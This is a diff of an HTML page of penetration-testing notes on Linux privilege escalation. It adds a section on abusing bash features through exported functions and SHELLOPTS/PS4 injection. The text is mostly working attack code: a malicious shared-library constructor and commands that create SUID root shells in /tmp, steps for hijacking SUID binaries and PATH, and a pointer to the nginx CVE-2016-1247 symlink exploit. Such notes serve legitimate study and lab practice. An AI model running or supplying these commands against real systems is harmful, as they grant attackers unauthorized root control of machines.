@@ -678,10 +678,7 @@ static void inject() __attribute((constructor));
 
 void inject() {
 system(&quot;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p&quot;);
-}
-
-
-</code></pre><p id="677fbf93-cb8f-4dbc-af5f-57e786aa2283" class="">Then:</p><pre id="f3cafe12-f55f-469c-9b34-6561b799b5fc" class="code"><code>chmod +s file
+}</code></pre><p id="677fbf93-cb8f-4dbc-af5f-57e786aa2283" class="">Then:</p><pre id="f3cafe12-f55f-469c-9b34-6561b799b5fc" class="code"><code>chmod +s file
 gcc  -shared -fPIC libcalc.c -o libcalc.so
 /usr/local/bin/suid-so</code></pre><h3 id="1c62579c-196a-48fd-adb9-f55063cef9c2" class="">Binary Simlinks</h3><p id="2239fdfa-5381-4ced-916d-fcbaceeca4c5" class=""><a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p><ul id="17752750-433a-4cf9-8bff-378f934f36c9" class="bulleted-list"><li style="list-style-type:disc">Find with linux exploit suggester (CVE-2016-1247)</li></ul><ul id="b0403d62-3b74-4084-b47e-c7d86890c568" class="bulleted-list"><li style="list-style-type:disc">nginxed-root.sh</li></ul><ul id="7f0cc8d6-721b-49da-a87d-67f37e73e405" class="bulleted-list"><li style="list-style-type:disc">Works on Nginx servers</li></ul><pre id="f2d40c5f-e626-4d5f-b866-cfb0187718c5" class="code code-wrap"><code>dpkg -l nginx</code></pre><p id="61d5a330-c00f-4b3e-837f-0887993b76bf" class="">Simlink to replace log files with malicious file...</p><h3 id="89023850-67ae-411d-842c-58b75e434212" class="">Environmental Variables</h3><p id="c17b1729-cfcf-4088-8085-24359b8ba83b" class="">
 </p><p id="efa99f70-8816-47ec-a1a9-7ccf88443833" class="">What if we change the environmental PATH variables</p><pre id="97d9923a-2740-4cd9-8794-e793d132ebdb" class="code code-wrap"><code>env
@@ -690,4 +687,23 @@ echo &#x27;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); ret
 
 #For explicit services
 #change the path to our malicious service</code></pre><p id="ca93916d-0ddb-4494-8d3e-e0e6f2d4c259" class="">
-</p></div></article></body></html>
+</p><p id="7ead9643-c3b3-4078-9753-fff4f63890b1" class=""><strong>Abusing shell features:</strong></p><pre id="c80ed1b8-e439-4f5c-918f-9647c38604e5" class="code"><code>#/bin/sh version exploit
+#1. search for SUID and GUIDs
+#2. check program with strings, strace, ltrace
+#3. if /bin/sh is used check version
+/bin/sh --version
+#4. if sh version is lower thatn 4.2-048 ...
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-found
+id
+
+--------
+#SHELLOPTS -&gt; below bash 4.4
+#1. search for SUID and GUIDs
+#2. check program with strings, strace, ltrace
+#3. if /bin/sh is used check version
+/bin/sh --version
+#4. if sh version is lower thatn 4.4...
+env -i SHELLOPTS=xtrace PS4=&#x27;${cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash}&#x27; /usr/local/bin/suid-found
+/tmp/rootbash -p</code></pre></div></article></body></html>
